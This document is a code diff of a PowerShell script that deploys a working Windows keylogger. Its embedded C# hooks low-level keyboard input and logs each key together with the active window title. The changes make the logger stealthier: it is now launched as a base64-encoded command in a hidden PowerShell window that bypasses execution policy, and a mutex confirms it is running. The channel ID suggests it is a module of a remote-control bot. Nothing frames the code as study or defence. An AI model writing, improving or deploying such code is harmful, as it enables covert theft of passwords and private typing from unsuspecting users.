@@ -2,26 +2,28 @@ param($args)
 
 $channelID = $env:ChannelID
 $logFile = "$env:TEMP\keylog_$channelID.txt"
+$mutexName = "Global\Keylogger_$channelID"
 $pidFile = "$env:TEMP\keylog_pid_$channelID.txt"
-$workerScript = "$env:TEMP\keylog_worker_$channelID.ps1"
 
-# Kill any previous keylogger process for this channel
+# Kill any previous instance for this channel
 if (Test-Path $pidFile) {
     $oldPid = Get-Content $pidFile
     Stop-Process -Id $oldPid -Force -ErrorAction SilentlyContinue
     Remove-Item $pidFile -Force -ErrorAction SilentlyContinue
-    Start-Sleep -Milliseconds 500
+    Start-Sleep -Seconds 1
 }
 
-# Worker script content (actual keylogger)
-$workerContent = @'
+# Clean previous log file if exists
+Remove-Item $logFile -Force -ErrorAction SilentlyContinue
+
+# Simplified, proven C# keylogger (based on PowerSploit's Get-Keystrokes)
 $cSharpCode = @"
 using System;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Threading;
-using System.Windows.Forms;
 
 public class Keylogger
 {
@@ -29,40 +31,27 @@ public class Keylogger
     private static IntPtr _hookID = IntPtr.Zero;
     private static string _logFile;
     private static StreamWriter _writer;
-    private static Thread _thread;
+    private static string _mutexName;
 
-    public static void Start(string logFile)
+    public static void Start(string logFile, string mutexName)
     {
         _logFile = logFile;
+        _mutexName = mutexName;
         _writer = new StreamWriter(logFile, true) { AutoFlush = true };
-        _thread = new Thread(Run);
-        _thread.SetApartmentState(ApartmentState.STA);
-        _thread.Start();
-    }
-
-    public static void Stop()
-    {
-        if (_hookID != IntPtr.Zero)
+        
+        // Create mutex to signal readiness
+        using (Mutex mutex = new Mutex(false, mutexName))
         {
-            UnhookWindowsHookEx(_hookID);
+            mutex.ReleaseMutex();
         }
-        Application.Exit();
-        if (_writer != null)
-        {
-            _writer.Close();
-        }
-    }
 
-    private static void Run()
-    {
         using (Process curProcess = Process.GetCurrentProcess())
         using (ProcessModule curModule = curProcess.MainModule)
         {
             _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc,
                 GetModuleHandle(curModule.ModuleName), 0);
         }
-        Application.Run();
-        UnhookWindowsHookEx(_hookID);
+        System.Windows.Forms.Application.Run();
     }
 
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
@@ -70,8 +59,19 @@ public class Keylogger
         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
         {
             int vkCode = Marshal.ReadInt32(lParam);
+            
+            // Get foreground window title
+            const int nChars = 256;
+            StringBuilder buff = new StringBuilder(nChars);
+            IntPtr handle = GetForegroundWindow();
+            string windowTitle = "";
+            if (GetWindowText(handle, buff, nChars) > 0)
+            {
+                windowTitle = buff.ToString();
+            }
+
             string keyName = ((Keys)vkCode).ToString();
-            _writer.WriteLine($"[{DateTime.Now:HH:mm:ss}] {keyName}");
+            _writer.WriteLine($"[{DateTime.Now:HH:mm:ss}][{windowTitle}] {keyName}");
         }
         return CallNextHookEx(_hookID, nCode, wParam, lParam);
     }
@@ -95,28 +95,38 @@ public class Keylogger
 
     [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("user32.dll")]
+    private static extern IntPtr GetForegroundWindow();
+
+    [DllImport("user32.dll")]
+    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 }
 "@
-Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms"
-$logFile = "$env:TEMP\keylog_$env:ChannelID.txt"
-[Keylogger]::Start($logFile)
-while($true) {
-    Start-Sleep -Seconds 10
-}
-'@
 
-# Write worker script to temp file (overwrite if exists)
-$workerContent | Out-File -FilePath $workerScript -Encoding utf8 -Force
+# Launch hidden PowerShell process with the compiled code
+$psScript = @"
+Add-Type -TypeDefinition @'
+$cSharpCode
+'@ -ReferencedAssemblies "System.Windows.Forms"
+[Keylogger]::Start("$logFile", "$mutexName")
+"@
 
-# Launch worker in hidden PowerShell window
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($psScript)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+
 $psi = New-Object System.Diagnostics.ProcessStartInfo
 $psi.FileName = "powershell.exe"
-$psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$workerScript`""
+$psi.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encodedCommand"
 $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
 $psi.CreateNoWindow = $true
 $p = [System.Diagnostics.Process]::Start($psi)
 
-# Save PID
+# Wait for mutex to confirm keylogger is running
+$mutex = New-Object System.Threading.Mutex($false, $mutexName)
+$mutex.WaitOne(5000) | Out-Null
+$mutex.Close()
+
 $p.Id | Out-File -FilePath $pidFile -Force
 
 Write-Output "Keylogger started with PID $($p.Id). Logging to $logFile"
